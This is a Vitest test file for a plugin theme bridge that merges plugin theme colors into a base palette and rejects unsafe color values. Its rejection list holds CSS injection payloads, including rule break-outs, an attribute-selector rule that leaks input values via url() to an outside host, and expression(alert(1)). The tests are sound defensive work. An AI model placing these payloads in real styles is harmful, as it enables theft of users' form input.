import { describe, it, expect } from 'vitest';
import { pluginThemeToTheme, pluginThemesToRecord } from '../../../shared/plugins/theme-bridge';
import type { ThemeColors } from '../../../shared/theme-types';
import type { ThemeContribution } from '../../../shared/plugins/contributions';

const baseDark: ThemeColors = {
	bgMain: '#1e1e1e',
	bgSidebar: '#252526',
	bgActivity: '#333333',
	border: '#444444',
	textMain: '#eeeeee',
	textDim: '#999999',
	accent: '#0a84ff',
	accentDim: '#0a84ff55',
	accentText: '#0a84ff',
	accentForeground: '#ffffff',
	success: '#30d158',
	warning: '#ffd60a',
	error: '#ff453a',
};

const baseLight: ThemeColors = {
	...baseDark,
	bgMain: '#ffffff',
	textMain: '#111111',
};

function contribution(overrides: Partial<ThemeContribution> = {}): ThemeContribution {
	return {
		id: 'com.acme/midnight',
		localId: 'midnight',
		pluginId: 'com.acme',
		name: 'Midnight',
		mode: 'dark',
		colors: { accent: '#ff00ff' },
		...overrides,
	};
}

describe('pluginThemeToTheme', () => {
	it('overlays contributed colors onto the base palette', () => {
		const theme = pluginThemeToTheme(contribution(), baseDark);
		expect(theme.id).toBe('com.acme/midnight');
		expect(theme.name).toBe('Midnight');
		expect(theme.mode).toBe('dark');
		// overridden
		expect(theme.colors.accent).toBe('#ff00ff');
		// inherited from base for keys the plugin omitted
		expect(theme.colors.bgMain).toBe('#1e1e1e');
		expect(theme.colors.textMain).toBe('#eeeeee');
	});

	it('ignores unrecognized color keys', () => {
		const theme = pluginThemeToTheme(
			contribution({ colors: { accent: '#abc', notARealKey: '#zzz', __proto__: 'x' } }),
			baseDark
		);
		expect(theme.colors.accent).toBe('#abc');
		expect((theme.colors as Record<string, string>).notARealKey).toBeUndefined();
		// prototype pollution attempt does not land on the palette
		expect(Object.prototype.hasOwnProperty.call(theme.colors, '__proto__')).toBe(false);
	});

	it('does not mutate the base palette', () => {
		const snapshot = { ...baseDark };
		pluginThemeToTheme(contribution({ colors: { bgMain: '#000000' } }), baseDark);
		expect(baseDark).toEqual(snapshot);
	});

	it('accepts optional ANSI and selection keys', () => {
		const theme = pluginThemeToTheme(
			contribution({ colors: { ansiRed: '#f00', selection: '#0ff' } }),
			baseDark
		);
		expect(theme.colors.ansiRed).toBe('#f00');
		expect(theme.colors.selection).toBe('#0ff');
	});
});

describe('pluginThemeToTheme color values', () => {
	// One key per plain color form the strict check accepts.
	const PLAIN_COLORS: Array<[keyof ThemeColors, string]> = [
		['accent', '#abc'],
		['accentDim', '#abcd'],
		['bgMain', '#0b0f1a'],
		['bgSidebar', '#0B0F1ACC'],
		['textMain', 'rgb(255, 255, 255)'],
		['textDim', 'rgba(255,255,255,0.6)'],
		['border', 'rgb(68 71 90 / 50%)'],
		['bgActivity', 'rgb(10%, 20%, 30%)'],
		['success', 'hsl(135, 94%, 65%)'],
		['warning', 'hsla(31, 100%, 71%, .9)'],
		['error', 'hsl(0deg 100% 67%)'],
		['accentText', 'rebeccapurple'],
		['accentForeground', 'White'],
		['selection', 'transparent'],
		['ansiRed', 'currentColor'],
	];

	it('keeps every plain color form', () => {
		const theme = pluginThemeToTheme(
			contribution({ colors: Object.fromEntries(PLAIN_COLORS) }),
			baseDark
		);
		for (const [key, value] of PLAIN_COLORS) {
			expect(theme.colors[key]).toBe(value);
		}
	});

	// Theme colors are written into `<style>` blocks. Each of these would close
	// the declaration or rule it lands in and add CSS of its own, or reach the
	// network from CSS (the CSP allows `img-src https:`).
	const REJECTED: Array<[string, string]> = [
		['the rule break-out', 'red;} * { background: url(https://x/?a'],
		[
			'an attribute-selector exfiltration rule',
			'red} input[value^="a"] { background-image: url(https://x/?p=a) } .x { color: red',
		],
		['url()', 'url(https://x/a.png)'],
		['url() inside a color function', 'rgb(url(https://x/), 0, 0)'],
		['expression()', 'expression(alert(1))'],
		['var()', 'var(--maestro-accent)'],
		['a semicolon', 'red;'],
		['a second declaration', '#fff; background-image: url(https://x/)'],
		['a closing brace', '#fff}'],
		['an opening brace', 'red{'],
		['a backslash escape', '\\72 ed'],
		['a trailing backslash', 'red\\'],
		['a trailing newline', '#fff\n'],
		['a leading newline', '\n#fff'],
		['a newline inside rgb()', 'rgb(1,\n2, 3)'],
		['a carriage return', '#fff\r'],
		['a form feed', 'red\f'],
		['a quote', '"red"'],
		['a comment', 'red/**/'],
		['an unknown keyword', 'inherit'],
		['an empty string', ''],
	];

	it.each(REJECTED)('drops %s and keeps the base value', (_label, value) => {
		const theme = pluginThemeToTheme(
			contribution({ colors: { accent: value, bgMain: '#000000' } }),
			baseDark
		);
		expect(theme.colors.accent).toBe(baseDark.accent);
		// One bad value drops only its own key, never the theme.
		expect(theme.colors.bgMain).toBe('#000000');
		expect(theme.id).toBe('com.acme/midnight');
	});

	it('drops a bad value through pluginThemesToRecord too', () => {
		const rec = pluginThemesToRecord(
			[contribution({ colors: { textMain: 'red;} * { background: url(https://x/?a' } })],
			baseDark,
			baseLight
		);
		expect(rec['com.acme/midnight'].colors.textMain).toBe(baseDark.textMain);
	});
});

describe('pluginThemesToRecord', () => {
	it('keys by namespaced id and picks the base by mode', () => {
		const rec = pluginThemesToRecord(
			[
				contribution({ id: 'com.a/dark1', localId: 'dark1', mode: 'dark', colors: {} }),
				contribution({ id: 'com.a/light1', localId: 'light1', mode: 'light', colors: {} }),
			],
			baseDark,
			baseLight
		);
		expect(Object.keys(rec).sort()).toEqual(['com.a/dark1', 'com.a/light1']);
		expect(rec['com.a/dark1'].colors.bgMain).toBe('#1e1e1e');
		expect(rec['com.a/light1'].colors.bgMain).toBe('#ffffff');
	});

	it('returns an empty record for no contributions', () => {
		expect(pluginThemesToRecord([], baseDark, baseLight)).toEqual({});
	});
});
